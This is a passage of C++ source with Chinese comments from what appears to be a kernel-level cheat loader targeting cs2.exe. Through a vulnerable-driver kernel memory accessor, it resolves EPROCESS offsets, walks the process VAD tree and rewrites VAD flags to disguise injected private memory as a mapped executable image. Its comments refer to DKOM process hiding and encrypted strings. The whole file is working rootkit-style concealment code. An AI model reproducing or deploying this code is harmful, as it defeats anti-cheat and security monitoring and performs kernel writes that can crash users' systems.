//   现象: off=0x558 (Win11 24H2 真正 VadRoot) P=0x1 → isValidPtr(0x1)=false → 拒绝
//         P=0x1 实际是 Balance=1 + Parent=NULL (根节点 Parent=NULL 正常)
//   修复: 掩码掉低 2 位 Balance (parent & ~0x3) 得到真实 Parent 指针再检查
struct VadOffsets {
    // EPROCESS 内部偏移 — 全部运行时动态解析, 不再硬编码
    // (Win10/11 23H2: UniqueProcessId=0x440, ActiveProcessLinks=0x448, VadRoot=0x7D8)
    // (Win11 24H2:    VadRoot=0x558, vergiliusproject.com 确认)

    // _RTL_BALANCED_NODE (embedded in _MMVAD_SHORT) — 跨版本稳定
    static constexpr uint32_t RbnLeft  = 0x00;
    static constexpr uint32_t RbnRight = 0x08;
    static constexpr uint32_t RbnParentEncoded = 0x10;

    // _MMVAD_SHORT (Win11 24H2, vergiliusproject.com 确认)
    // +0x18 ULONG StartingVpn      (4字节)
    // +0x1C ULONG EndingVpn        (4字节) ← v3.269 错误: 0x20 (应为 0x1C)
    // +0x20 UCHAR StartingVpnHigh  (1字节)
    // +0x21 UCHAR EndingVpnHigh    (1字节)
    // +0x30 ULONG VadFlags         (4字节)
    //        +bit0-3   Lock/LockContended/DeleteInProgress/NoChange
    //        +bit4-6   VadType (3 bits)
    //        +bit7-11  Protection (5 bits) ← v3.269 错误: bits 19-23
    //        +bit12-18 PreferredNode (7 bits)
    //        +bit19-20 PageSize (2 bits)
    //        +bit21     PrivateMemory (1 bit) ← v3.269 错误: bit 24
    static constexpr uint32_t VadStartingVpn = 0x18;
    static constexpr uint32_t VadEndingVpn   = 0x1C;  // ★ v3.270 FIX: 0x20 → 0x1C
    static constexpr uint32_t VadFlags       = 0x30;  // u.LongFlags / u.VadFlags union
    static constexpr uint32_t VadControlArea = 0x38;

    // ★ v3.270 FIX: PrivateMemoryBit bit24 → bit21 (vergiliusproject.com _MMVAD_FLAGS 确认)
    // ★ v3.272 FIX: 改为 uint32_t — VadFlags 是 ULONG (4字节), 用 uint64_t 读写会覆盖相邻字段
    static constexpr uint32_t PrivateMemoryBit  = 0x00200000UL; // bit 21
    // ★ v3.270 FIX: ProtectionMask bits 19-23 → bits 7-11
    static constexpr uint32_t ProtectionMask    = 0x00000F80UL; // bits 7-11 (5 bits)
};

// ★ BUILD 555: 静态偏移缓存成员定义 (header 中声明)
uint32_t VADConcealer::s_pidOffset     = 0;
uint32_t VADConcealer::s_linksOffset   = 0;
uint32_t VADConcealer::s_vadRootOffset = 0;
// ★ BUILD 567 v3.235: loader.exe EPROCESS 地址缓存 (避免 DKOM 断链后 VAD 找不到 loader.exe)
uint64_t VADConcealer::s_cachedLoaderEprocess = 0;
// ★ v3.296 FIX-22: 记录被修改的 VAD 节点 (用于 RestoreAllRegions 恢复)
VADConcealer::ModifiedVad VADConcealer::s_modifiedVads[MAX_MODIFIED_VADS] = {};
int VADConcealer::s_modifiedVadCount = 0;

// ★ BUILD 555: 动态解析 UniqueProcessId / ActiveProcessLinks 偏移
//   算法复用 DKOMProcessHider::EnsureOffsetsResolved (byovd_kernel.cpp L3144)
//   扫描 System EPROCESS (PID=4) 0x100-0x800 范围:
//     1. 找到值为 4 的字段 (UniqueProcessId)
//     2. 验证其后 8/16 字节是内核地址 (ActiveProcessLinks.Flink/Blink)
//     3. 二次验证: 通过 Flink 遍历到下一个 EPROCESS, PID 应为合法值
bool VADConcealer::EnsureEprocessOffsets(KernelMemoryAccessor& kma, uint64_t ntBase) {
    if (s_pidOffset != 0 && s_linksOffset != 0) return true;  // 已缓存

    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 PsInitialSystemProcess
    char psInitProcName3[40] = {};
    STEALTH_STR_DECRYPT_TO("PsInitialSystemProcess", psInitProcName3, sizeof(psInitProcName3));
    uint64_t psInitProcVA = kma.ResolveExport(ntBase, psInitProcName3);
    if (!psInitProcVA) {
        VadDiag("B554:EEP: FAIL PsInitialSystemProcess not resolved (ntBase=0x%llX)\n",
                  (unsigned long long)ntBase);
        return false;
    }

    uint64_t systemEPROCESS = kma.Read<uint64_t>(psInitProcVA);
    if (!systemEPROCESS || systemEPROCESS < 0xFFFF800000000000ULL) {
        VadDiag("B554:EEP: FAIL systemEPROCESS invalid (psInitVA=0x%llX val=0x%llX)\n",
                  (unsigned long long)psInitProcVA, (unsigned long long)systemEPROCESS);
        return false;
    }

    // ★ BUILD 567 v3.233: 记录 systemEPROCESS 地址, 判断是否在白名单外
    //   白名单 [0xFFFFF680, 0xFFFFFD00), 系统 PTE 区域 [0xFFFFFD00, 0xFFFFFE00)
    //   v3.232 发现 pidMatch=0, 推测 systemEPROCESS 在系统 PTE 区域被白名单拒绝
    bool inWhitelist = (systemEPROCESS >= 0xFFFFF68000000000ULL && systemEPROCESS < 0xFFFFFD0000000000ULL);
    bool inSystemPte = (systemEPROCESS >= 0xFFFFFD0000000000ULL && systemEPROCESS < 0xFFFFFE0000000000ULL);
    VadDiag("B554:EEP: systemEPROCESS=0x%llX inWhitelist=%d inSystemPte=%d\n",
              (unsigned long long)systemEPROCESS, (int)inWhitelist, (int)inSystemPte);

    int pidMatchCount = 0;
    for (uint32_t off = 0x100; off < 0x800; off += 8) {
        // ★ BUILD 567 v3.233: 使用 ReadUnsafe 绕过白名单 (systemEPROCESS 可能在系统 PTE 区域)
        uint64_t val = kma.ReadUnsafe<uint64_t>(systemEPROCESS + off);
        if (val != 4) continue;  // System PID = 4
        pidMatchCount++;

        // 验证 off+8 (Flink) 和 off+16 (Blink) 是内核地址
        uint64_t flink = kma.ReadUnsafe<uint64_t>(systemEPROCESS + off + 8);
        uint64_t blink = kma.ReadUnsafe<uint64_t>(systemEPROCESS + off + 16);
        if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) {
            VadDiag("B554:EEP: off=0x%X PID=4 but flink/blink not kernel (flink=0x%llX blink=0x%llX)\n",
                      off, (unsigned long long)flink, (unsigned long long)blink);
            continue;
        }

        // 二次验证: 通过 Flink 遍历到下一个 EPROCESS, 读取其 PID
        uint64_t nextEPROC = flink - (off + 8);
        uint64_t nextPid = kma.ReadUnsafe<uint64_t>(nextEPROC + off);
        if (nextPid == 0 || nextPid >= 100000) {
            VadDiag("B554:EEP: off=0x%X PID=4 but nextPid invalid (nextPid=%llu)\n",
                      off, (unsigned long long)nextPid);
            continue;
        }

        // 验证通过
        s_pidOffset = off;
        s_linksOffset = off + 8;
        VadDiag("B554:EEP: OK pidOffset=0x%X linksOffset=0x%X (pidMatch=%d)\n",
                  off, off + 8, pidMatchCount);
        return true;
    }
    VadDiag("B554:EEP: FAIL no valid PID=4 offset found (pidMatch=%d)\n", pidMatchCount);
    return false;
}

// ★ BUILD 555: 动态解析 VadRoot 偏移
//   策略 1: 优先尝试已知候选偏移列表 [0x7D8, 0x658, 0x9D8, 0xA20, 0x6D8, 0x5D8]
//           (覆盖 Win10 22H2 / Win11 23H2 / Win11 24H2 / Win11 25H2 常见偏移)
//   策略 2: 候选失败时扫描 EPROCESS 0x400-0x900 范围, 找符合 RTL_BALANCED_NODE 特征:
//     1. VadRoot 本身是内核地址 (指向 RTL_BALANCED_NODE 结构)
//     2. RTL_BALANCED_NODE.Left/Right/ParentEncoded 三字段都是 NULL 或内核地址
//     3. 二次验证: 候选节点 +0x18 (VadStartingVpn) / +0x20 (VadEndingVpn) 合理
//        (startVpn <= endVpn, 且 startVpn < 0x80000000 用户态 或 >= 0xFFFF800000000000 内核特殊 VAD)
bool VADConcealer::EnsureVadRootOffset(KernelMemoryAccessor& kma, uint64_t eprocess) {
    if (s_vadRootOffset != 0) return true;  // 已缓存

    // 指针合法性检查: NULL 或内核地址 (>=0xFFFF800000000000)
    // ★ BUILD 567 v3.230 FIX: 仅用于 AVL 节点 Left/Right/Parent (NULL 合法)
    auto isValidPtr = [](uint64_t p) {
        return p == 0 || p >= 0xFFFF800000000000ULL;
    };

    // 验证候选偏移是否为合法 VadRoot (含 Left/Right/ParentEncoded + VadStartingVpn/VadEndingVpn)
    // ★ BUILD 567 v3.262 DIAG: 添加详细诊断日志, 记录每个失败原因
    // ★ BUILD 567 v3.272 FIX: 移除 v3.271 错误的双重解引用
    //   _RTL_AVL_TREE 只有一个字段 Root (8字节指针), 读取 EPROCESS+offset 得到的值
    //   就是指向 _RTL_BALANCED_NODE 的指针, 不需要再解引用.
    //   v3.271 错误: 多解引用一次 → 读到的是根节点的 Left 字段, 不是根节点本身.
    //   修复: 直接用 candidate 作为 _RTL_BALANCED_NODE 地址验证.
    auto validateVadRoot = [&](uint64_t vadRootCandidate, uint32_t off = 0) -> bool {
        if (!vadRootCandidate || vadRootCandidate < 0xFFFF800000000000ULL) return false;

        // ★ BUILD 567 v3.230 FIX: 显式检查 ReadKernelVA 返回值, 避免读取失败被误判为 0
        //   v3.229 缺陷: Read<uint64_t> 模板无法区分"读取失败"和"值为0"
        //   当 vadRootCandidate 在分页池 (v3.229 白名单排除) 时, ReadKernelVA 失败返回 0
        //   isValidPtr(0)=true + 0>0=false + 0<0x80000000=true → 错误验证通过, 缓存错误偏移
        //   修复: 直接调用 ReadKernelVA 检查返回值, 读取失败立即返回 false
        // ★ BUILD 567 v3.233: 改用 ReadKernelVAUnsafe (VAD 节点可能在系统 PTE 区域)
        uint64_t left = 0, right = 0, parent = 0;
        if (!kma.ReadKernelVAUnsafe(vadRootCandidate + VadOffsets::RbnLeft, &left, 8)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL read left (cand=0x%llX)\n", off, (unsigned long long)vadRootCandidate);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadRootCandidate + VadOffsets::RbnRight, &right, 8)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL read right (cand=0x%llX)\n", off, (unsigned long long)vadRootCandidate);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadRootCandidate + VadOffsets::RbnParentEncoded, &parent, 8)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL read parent (cand=0x%llX)\n", off, (unsigned long long)vadRootCandidate);
            return false;
        }
        // ★ BUILD 567 v3.273 FIX: _RTL_BALANCED_NODE.Parent 低 2 位是 Balance (红黑树), 不是指针
        //   字段名 RbnParentEncoded 已暗示是编码后的 Parent, 但 v3.272 之前验证时忘了解码.
        //   现象: off=0x558 (Win11 24H2 真正 VadRoot) P=0x1 → isValidPtr(0x1)=false → 拒绝
        //   根因: P=0x1 实际是 Balance=1 + Parent=NULL (根节点 Parent=NULL 正常)
        //   修复: 掩码掉低 2 位 Balance 得到真实 Parent 指针再检查
        uint64_t parentPtr = parent & ~0x3ULL;
        if (!isValidPtr(left) || !isValidPtr(right) || !isValidPtr(parentPtr)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL ptr check L=0x%llX R=0x%llX P=0x%llX (parentPtr=0x%llX)\n",
                off, (unsigned long long)left, (unsigned long long)right,
                (unsigned long long)parent, (unsigned long long)parentPtr);
            return false;
        }

        // ★ BUILD 567 v3.230 FIX: 至少一个非 NULL (完全空的节点不太可能是真实 VadRoot)
        //   深度防御: 真实 VAD 树根节点通常有子节点或父指针, 三字段全 0 极不可能
        // ★ BUILD 567 v3.273: 用 parentPtr (解码后) 判断, parent=0x1 时 parentPtr=0 (Balance=1)
        if (!left && !right && !parentPtr) {
            VadDiag("B554:EVR:VR off=0x%X FAIL all NULL (parent=0x%llX Balance=%llu)\n",
                off, (unsigned long long)parent, (unsigned long long)(parent & 0x3));
            return false;
        }

        // ★ BUILD 567 v3.263 FIX: Left 和 Right 不能都非 NULL 且相等 (AVL 树节点不应指向同一地址)
        //   v3.262 测试发现 off=0xAA8 误报: L=R=0xFFFFCD045294CB28, 导致 FindAndModifyVadNode 死循环
        //   真实 AVL 节点: Left/Right 指向不同子节点, 或都是 NULL (叶子节点)
        //   误报模式: Left=Right=同一非 NULL 地址 (可能是其他字段的值被误读为指针)
        if (left && right && left == right) {
            VadDiag("B554:EVR:VR off=0x%X FAIL L==R (same addr 0x%llX)\n", off, (unsigned long long)left);
            return false;
        }

        // 二次验证: VadStartingVpn <= VadEndingVpn
        // ★ BUILD 567 v3.272 FIX: VPN 字段是 ULONG (4字节) + UCHAR VpnHigh (1字节)
        //   v3.271 缺陷: 用 8 字节读取, 跨越 StartingVpn/EndingVpn 两个字段, 得到垃圾值
        //   导致 startValid/endValid 检查拒绝所有合法 VAD 根 → VAD 隐藏 0/1 失败.
        //   修复: 读取 4 字节 Vpn + 1 字节 VpnHigh, 合并为 64 位 VPN (与 FindAndModifyVadNode 一致).
        uint32_t startVpnLow = 0, endVpnLow = 0;
        uint8_t  startVpnHigh = 0, endVpnHigh = 0;
        if (!kma.ReadKernelVAUnsafe(vadRootCandidate + VadOffsets::VadStartingVpn, &startVpnLow, 4)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL read startVpnLow\n", off);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadRootCandidate + VadOffsets::VadEndingVpn, &endVpnLow, 4)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL read endVpnLow\n", off);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadRootCandidate + 0x20, &startVpnHigh, 1)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL read startVpnHigh\n", off);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadRootCandidate + 0x21, &endVpnHigh, 1)) {
            VadDiag("B554:EVR:VR off=0x%X FAIL read endVpnHigh\n", off);
            return false;
        }
        uint64_t startVpn = ((uint64_t)startVpnHigh << 32) | startVpnLow;
        uint64_t endVpn   = ((uint64_t)endVpnHigh   << 32) | endVpnLow;
        if (startVpn > endVpn) {
            VadDiag("B554:EVR:VR off=0x%X FAIL vpn range start=0x%llX > end=0x%llX\n",
                off, (unsigned long long)startVpn, (unsigned long long)endVpn);
            return false;
        }

        // ★ BUILD 567 v3.265 FIX: 如果 L=0 且 R=0, 则 sVpn 或 eVpn 必须非零
        //   v3.264 测试 Win11 24H2: off=0xD88 误报 L=0 R=0 P=非空 sVpn=0 eVpn=0
        //   真实 VadRoot 是 AVL 树根节点, 通常有子节点 (loader.exe 有多个 VAD 节点)
        //   例外: 叶子节点 (L=R=0) 的 sVpn/eVpn 应该非零 (真实 VAD 范围)
        //   修复: L=0 且 R=0 且 sVpn=0 且 eVpn=0 → 误报, 拒绝
        if (!left && !right && !startVpn && !endVpn) {
            VadDiag("B554:EVR:VR off=0x%X FAIL L=R=sVpn=eVpn=0 (likely not VadRoot)\n", off);
            return false;
        }

        // ★ BUILD 555 P2-verify: 修正 VPN 范围检查 (原 < 0x100000 过于严格)
        //   x64 用户态 VA 范围: 0 to 0x0000_7FFF_FFFF_FFFF (128 TB, 48 位)
        //   VPN = VA >> 12, 用户态 VPN 范围: 0 to 0x7FFF_FFFF_FFFF (40 位, ~128TB 页)
        //   原 < 0x100000 (1M 页 = 4GB) 会误判大部分高地址 VAD 节点 (如 0x00007FF6_xxxx 加载基址)
        //   新策略: 接受 0 to 0x7FFFFFFFFFFF (用户态) 或 >= 0xFFFF800000000000 (内核特殊 VAD)
        //   拒绝中间值 (0x800000000000 to 0xFFFF7FFFFFFFFFFF, 非法/未定义区域)
        // ★ BUILD 567 v3.263 FIX: 收紧 endVpn 验证 — 只接受用户态 VPN (< 0x800000000000)
        //   v3.262 测试发现 off=0xAA8 误报: eVpn=0xFFFFF8018E7BAE30 (内核地址) 通过验证
        //   原因: VAD 是用户态内存映射, endVpn 应该是用户态 VPN, 不应是内核地址
        //   修复: endVpn 只接受 < 0x800000000000 (用户态), 不接受内核特殊 VAD
        //   startVpn 保持原逻辑 (允许内核特殊 VAD, 兼容系统进程)
        // ★ BUILD 567 v3.272: 现在 VPN 值正确 (4字节+VpnHigh), 此检查才真正生效
        // ★ BUILD 567 v3.275 FIX: VPN 阈值从 32 位 (0x80000000) 改为 40 位 (0x800000000000)
        //   v3.274 测试发现 off=0x558 被误拒: start=0x7FF461DC0 end=0x7FF561DDF
        //   根因: (VpnHigh << 32) | VpnLow 合并后是 40 位值 (如 0x7FF461DC0)
        //         但阈值 0x80000000 是 32 位 (2GB), 0x7FF461DC0 > 0x80000000 → 误拒
        //   修复: 阈值改为 0x800000000000 (40 位, 对应 48 位用户态 VA 上限 0x7FFFFFFFFFFF)
        //         用户态 VPN 范围: 0 to 0x7FFFFFFFFFFF (40 位)
        //         内核特殊 VAD: >= 0xFFFF800000000000 (48 位内核 VA >> 12)
        static constexpr uint64_t USER_VPN_MAX = 0x800000000000ULL;  // 40 位用户态 VPN 上限
        bool startValid = (startVpn < USER_VPN_MAX) || (startVpn >= 0xFFFF800000000000ULL);
        bool endValid   = (endVpn < USER_VPN_MAX);  // ★ v3.263: 收紧, 只接受用户态
        if (!startValid || !endValid) {
            VadDiag("B554:EVR:VR off=0x%X FAIL vpn valid start=0x%llX(%d) end=0x%llX(%d)\n",
                off, (unsigned long long)startVpn, (int)startValid,
                (unsigned long long)endVpn, (int)endValid);
            return false;
        }

        VadDiag("B554:EVR:VR off=0x%X OK L=0x%llX R=0x%llX P=0x%llX sVpn=0x%llX eVpn=0x%llX\n",
            off, (unsigned long long)left, (unsigned long long)right, (unsigned long long)parent,
            (unsigned long long)startVpn, (unsigned long long)endVpn);
        return true;
    };

    // 策略 1: 优先尝试已知候选偏移
    // ★ BUILD 567 v3.270 FIX: 添加 Win11 24H2 VadRoot=0x558 (vergiliusproject.com 确认)
    static const uint32_t knownCandidates[] = {
        0x558,  // ★ Win11 24H2 (Build 26100) — vergiliusproject.com 确认
        0x7D8,  // Win10 22H2 / Win11 22H2/23H2
        0x658,  // Win11 备选
        0x9D8,  // Win11 备选
        0xA20,  // Win11 25H2 候选
        0x6D8,  // Win10 21H2
        0x5D8,  // Win10 20H2
    };
    for (uint32_t off : knownCandidates) {
        // ★ BUILD 567 v3.233: 使用 ReadUnsafe (eprocess 可能在系统 PTE 区域)
        uint64_t candidate = kma.ReadUnsafe<uint64_t>(eprocess + off);
        bool valid = validateVadRoot(candidate, off);
        VadDiag("B554:EVR: try off=0x%X candidate=0x%llX valid=%d\n",
                  off, (unsigned long long)candidate, (int)valid);
        if (valid) {
            s_vadRootOffset = off;
            VadDiag("B554:EVR: OK via known candidate off=0x%X\n", off);
            return true;
        }
    }

    // 策略 2: 动态扫描 0x400-0x1000 范围 (★ BUILD 567 v3.262: 扩大范围 0x900→0x1000)
    int scanMatchCount = 0;
    for (uint32_t off = 0x400; off < 0x1000; off += 8) {
        // 跳过已知已尝试的偏移
        bool skip = false;
        for (uint32_t k : knownCandidates) {
            if (off == k) { skip = true; break; }
        }
        if (skip) continue;

        // ★ BUILD 567 v3.233: 使用 ReadUnsafe (eprocess 可能在系统 PTE 区域)
        uint64_t candidate = kma.ReadUnsafe<uint64_t>(eprocess + off);
        if (candidate >= 0xFFFF800000000000ULL) {
            scanMatchCount++;
            if (scanMatchCount <= 8) {  // 限制日志量, 只打印前 8 个候选
                VadDiag("B554:EVR: scan off=0x%X candidate=0x%llX\n",
                          off, (unsigned long long)candidate);
            }
        }
        if (validateVadRoot(candidate, off)) {
            s_vadRootOffset = off;
            VadDiag("B554:EVR: OK via scan off=0x%X (scanMatch=%d)\n", off, scanMatchCount);
            return true;
        }
    }
    VadDiag("B554:EVR: FAIL no valid VadRoot offset (scanMatch=%d range=0x400-0x1000)\n", scanMatchCount);
    return false;
}

// 获取 cs2.exe 的 EPROCESS 内核地址 (★ BUILD 555: 改用动态偏移)
//   pidOffset/linksOffset 由调用方 (ConcealRegion) 通过 EnsureEprocessOffsets 解析后传入
static uint64_t GetEPROCESSByPid(KernelMemoryAccessor& kma, DWORD targetPid, uint64_t ntosBase,
                                  uint32_t pidOffset, uint32_t linksOffset) {
    if (!pidOffset || !linksOffset) return 0;

    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 PsInitialSystemProcess
    char psInitProcName4[40] = {};
    STEALTH_STR_DECRYPT_TO("PsInitialSystemProcess", psInitProcName4, sizeof(psInitProcName4));
    uint64_t psInitAddr = kma.ResolveExport(ntosBase, psInitProcName4);
    if (!psInitAddr) {
        VadDiag("B554:GEP: FAIL PsInitialSystemProcess not resolved\n");
        return 0;
    }

    uint64_t sysEprocess = kma.Read<uint64_t>(psInitAddr);
    if (!sysEprocess || sysEprocess < 0xFFFF800000000000ULL) {
        VadDiag("B554:GEP: FAIL sysEprocess invalid (val=0x%llX)\n",
                  (unsigned long long)sysEprocess);
        return 0;
    }

    uint64_t current = sysEprocess;
    // ★ BUILD 567 v3.235: 添加循环检测 — Windows ActiveProcessLinks 是双向循环链表,
    //   遍历完整个链表后会回到 sysEprocess. 原代码缺少 start 检测, 会跑满 maxWalk=512 次.
    //   对比 DKOM FindEPROCESSByPid (L3470) 已有 start 检测 + maxIter=1024.
    uint64_t start = sysEprocess;
    int maxWalk = 1024;  // ★ v3.235: 512 → 1024 (与 DKOM FindEPROCESSByPid 一致)
    int walkCount = 0;
    while (maxWalk-- > 0) {
        walkCount++;
        // ★ BUILD 567 v3.233: 使用 ReadUnsafe (EPROCESS 可能在系统 PTE 区域)
        uint64_t pid = kma.ReadUnsafe<uint64_t>(current + pidOffset);
        if (pid == targetPid) {
            VadDiag("B554:GEP: OK pid=%u eprocess=0x%llX (walk=%d)\n",
                      targetPid, (unsigned long long)current, walkCount);
            return current;
        }

        // ★ v3.235: 每 100 次输出诊断日志 (排查链表遍历问题)
        if (walkCount % 100 == 0) {
            VadDiag("B554:GEP: walk=%d current=0x%llX pid=%llu (looking for %u)\n",
                      walkCount, (unsigned long long)current, (unsigned long long)pid, targetPid);
        }

        uint64_t flink = kma.ReadUnsafe<uint64_t>(current + linksOffset);
        if (!flink || flink < 0xFFFF800000000000ULL) {
            VadDiag("B554:GEP: chain broken at walk=%d EPROC=0x%llX flink=0x%llX (pid=%u)\n",
                      walkCount, (unsigned long long)current, (unsigned long long)flink, targetPid);
            break;
        }
        current = flink - linksOffset;

        // ★ v3.235: 循环检测 — 回到起点说明遍历完整个链表 (loader.exe 不在链表里, 可能被隐藏)
        if (current == start) {
            VadDiag("B554:GEP: cycle back to start at walk=%d (pid=%u not in ActiveProcessLinks — hidden?)\n",
                      walkCount, targetPid);
            break;
        }
    }
    VadDiag("B554:GEP: FAIL pid=%u not found (walk=%d)\n", targetPid, walkCount);
    return 0;
}

// AVL 树序遍历, 查找包含 targetVA 的 VAD 节点
static bool FindAndModifyVadNode(KernelMemoryAccessor& kma, uint64_t vadNode, uint64_t targetVa, DWORD pid) {
    if (!vadNode || !targetVa) return false;

    uint64_t targetVpn = targetVa >> 12;
    int maxDepth = 64;  // ★ v3.270: 128 → 64, VAD 树深度通常 < 32
    int traverseCount = 0;  // ★ BUILD 567 v3.264 DIAG: 遍历计数

    // ★ BUILD 567 v3.270 SAFETY: 环检测 — 记录已访问节点, 防止 AVL 树环导致死循环
    //   v3.267 系统卡死根因: VadOffsets 错误导致遍历跟随错误指针 → 环 → 死循环
    //   修复: 记录最近 64 个节点地址, 重复访问则判定为环, 立即退出
    //   注: 使用固定数组 (避免 std::vector 依赖, 减少 shellcode 体积)
    static const int MAX_VISITED = 64;
    uint64_t visitedNodes[MAX_VISITED];
    int visitedCount = 0;

    VadDiag("B554:FMVN:enter vadRoot=0x%llX targetVa=0x%llX targetVpn=0x%llX\n",
        (unsigned long long)vadNode, (unsigned long long)targetVa, (unsigned long long)targetVpn);

    while (vadNode && maxDepth-- > 0) {
        traverseCount++;

        // ★ BUILD 567 v3.270 SAFETY: 环检测 — 检查是否已访问过此节点
        bool isCycle = false;
        for (int i = 0; i < visitedCount; i++) {
            if (visitedNodes[i] == vadNode) {
                isCycle = true;
                break;
            }
        }
        if (isCycle) {
            VadDiag("B554:FMVN:FAIL cycle detected node=0x%llX (traverse=%d) — ABORT to prevent freeze\n",
                (unsigned long long)vadNode, traverseCount);
            return false;
        }
        if (visitedCount < MAX_VISITED) {
            visitedNodes[visitedCount++] = vadNode;
        }
        // ★ BUILD 567 v3.236 FIX-4: 放宽边界到 [0xFFFF8000..., 0xFFFFFD00...) — 与 validateVadRoot 一致
        //   根因: v3.235 测试 vadRoot=0xFFFFE48DDD3F9FD8 在非分页池扩展区域 (0xFFFF8000-0xFFFFF680),
        //         被原边界 [0xFFFFFC00, 0xFFFFFD00) 拒绝 → FindAndModifyVadNode result=0 → VAD 隐藏失败.
        //         vadRoot=0xFFFFE48D... < 0xFFFFF800, 即使放宽到 0xFFFFF800 仍会被拒绝.
        //   Win11 24H2/25H2 VAD 节点 (_MMVAD_SHORT) 可能分配在非分页池扩展区域 (与 EPROCESS 同区域).
        //   修复: 下限放宽到 0xFFFF8000 (与 validateVadRoot L7827 一致, 覆盖所有内核池区域),
        //         上限保持 0xFFFFFD00 (分页池上限, 排除系统 PTE/系统映射/Hypervisor).
        //   安全性: VAD 节点是有效内核内存 (ExAllocatePoolWithTag 分配), 读取不应导致 0x50 蓝屏.
        //           validateVadRoot 已验证 VPN 范围 + Left/Right/Parent 指针, 此处仅放宽地址范围检查.
        //           即使遍历到非 VAD 节点, 后续 ReadKernelVA 读取 VadStartingVpn/VadEndingVpn 会返回
        //           垃圾值, targetVpn 范围检查失败 → 自然停止遍历 (maxDepth 兜底).
        if (vadNode < 0xFFFF800000000000ULL || vadNode >= 0xFFFFFD0000000000ULL) {
            VadDiag("B554:FMVN:FAIL addr range vadNode=0x%llX (traverse=%d)\n",
                (unsigned long long)vadNode, traverseCount);
            return false;
        }

        // ★ BUILD 567 v3.270 FIX: 正确读取 Win11 24H2 VAD VPN 字段
        //   _MMVAD_SHORT: +0x18 ULONG StartingVpn (4字节) + +0x20 UCHAR StartingVpnHigh (1字节)
        //                +0x1C ULONG EndingVpn   (4字节) + +0x21 UCHAR EndingVpnHigh   (1字节)
        //   完整 VPN = (VpnHigh << 32) | Vpn  (64位)
        //   v3.269 错误: 读取 8 字节 (包含 VpnHigh 但偏移错误), 导致遍历逻辑错误
        uint32_t startVpnLow = 0, endVpnLow = 0;
        uint8_t startVpnHigh = 0, endVpnHigh = 0;
        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::VadStartingVpn, &startVpnLow, 4)) {
            VadDiag("B554:FMVN:FAIL read startVpnLow vadNode=0x%llX (traverse=%d)\n",
                (unsigned long long)vadNode, traverseCount);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::VadEndingVpn, &endVpnLow, 4)) {
            VadDiag("B554:FMVN:FAIL read endVpnLow vadNode=0x%llX (traverse=%d)\n",
                (unsigned long long)vadNode, traverseCount);
            return false;
        }
        // ★ v3.270: 读取 VpnHigh 字节 (+0x20 StartingVpnHigh, +0x21 EndingVpnHigh)
        if (!kma.ReadKernelVAUnsafe(vadNode + 0x20, &startVpnHigh, 1)) {
            VadDiag("B554:FMVN:FAIL read startVpnHigh (traverse=%d)\n", traverseCount);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadNode + 0x21, &endVpnHigh, 1)) {
            VadDiag("B554:FMVN:FAIL read endVpnHigh (traverse=%d)\n", traverseCount);
            return false;
        }
        // 合并为完整 64 位 VPN
        uint64_t startVpn = ((uint64_t)startVpnHigh << 32) | startVpnLow;
        uint64_t endVpn   = ((uint64_t)endVpnHigh   << 32) | endVpnLow;

        // ★ BUILD 567 v3.264 DIAG: 遍历日志 (前 8 次)
        if (traverseCount <= 8) {
            VadDiag("B554:FMVN:trav=%d node=0x%llX sVpn=0x%llX eVpn=0x%llX\n",
                traverseCount, (unsigned long long)vadNode,
                (unsigned long long)startVpn, (unsigned long long)endVpn);
        }

        if (targetVpn >= startVpn && targetVpn <= endVpn) {
            // 找到目标 VAD 节点, 修改 PrivateMemory flag
            // ★ BUILD 567 v3.272 FIX: VadFlags 是 ULONG (4字节), 用 uint32_t 读写
            //   v3.271 缺陷: 用 uint64_t 读写 8 字节, 写入会覆盖 0x34 处的相邻字段 → 蓝屏 0x50
            uint32_t flags = 0;
            if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::VadFlags, &flags, 4)) {
                VadDiag("B554:FMVN:FAIL read flags (traverse=%d)\n", traverseCount);
                return false;
            }

            VadDiag("B554:FMVN:FOUND node=0x%llX flags=0x%08X (traverse=%d)\n",
                (unsigned long long)vadNode, (unsigned)flags, traverseCount);

            // 检查 PrivateMemory bit 是否已设置
            if (flags & VadOffsets::PrivateMemoryBit) {
                // ★ v3.296 FIX-22: 记录原始 flags (用于 RestoreAllRegions 恢复)
                //   如果不恢复, PspExitProcess 清理 VAD 时 dereference ControlArea (NULL) → 0x3B 蓝屏
                uint32_t origFlags = flags;

                // 清零 PrivateMemory bit → MEM_MAPPED
                flags &= ~VadOffsets::PrivateMemoryBit;

                // 设置 Protection = EXECUTE_READ (5), 模拟 .text 段映射
                flags &= ~VadOffsets::ProtectionMask;
                flags |= (5UL << 7);  // ★ v3.270 FIX: Protection bits 7-11, value 5 = PAGE_EXECUTE_READ

                // ★ BUILD 567 v3.272 FIX: 改用 uint32_t 写入 4 字节 — 避免覆盖相邻字段
                kma.WriteUnsafe<uint32_t>(vadNode + VadOffsets::VadFlags, flags);

                // ★ v3.296 FIX-22: 记录修改的 VAD 节点 (用于 RestoreAllRegions)
                VADConcealer::RecordModifiedVad(vadNode, origFlags, pid);

                VadDiag("B554:FMVN:MODIFIED node=0x%llX newFlags=0x%08X (origFlags=0x%08X, recorded for restore)\n",
                    (unsigned long long)vadNode, (unsigned)flags, (unsigned)origFlags);
                return true;
            }
            VadDiag("B554:FMVN:already MAPPED (traverse=%d)\n", traverseCount);
            return false; // 已经是 MAPPED
        }

        // AVL 遍历: 根据 VPN 决定走左子树还是右子树
        uint64_t left = 0, right = 0;
